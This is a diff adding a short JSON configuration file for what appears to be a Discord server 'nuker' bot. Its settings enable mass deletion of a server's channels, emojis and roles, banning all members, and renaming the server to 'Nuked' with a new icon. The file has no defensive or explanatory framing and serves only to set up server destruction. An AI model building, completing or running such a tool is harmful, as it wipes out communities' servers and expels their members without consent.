@@ -1,0 +1,21 @@
+{
+    "auto_invite_create_when_bot_join_in_a_guid": false, 
+    "auto_nuke": false,
+    "delete": { 
+        "channels": true,
+        "emojis": true,
+        "roles": true
+    },
+    "create_after_nuke": { 
+        "channels": false,
+        "roles": true,
+        "emojis": true
+    },
+    "actions": {
+        "ban_all": true,
+        "change_server_icon": true,
+        "change_server_name": true
+    },
+    "name": "Nuked", 
+    "icon": "https://example.com/test.png"
+}
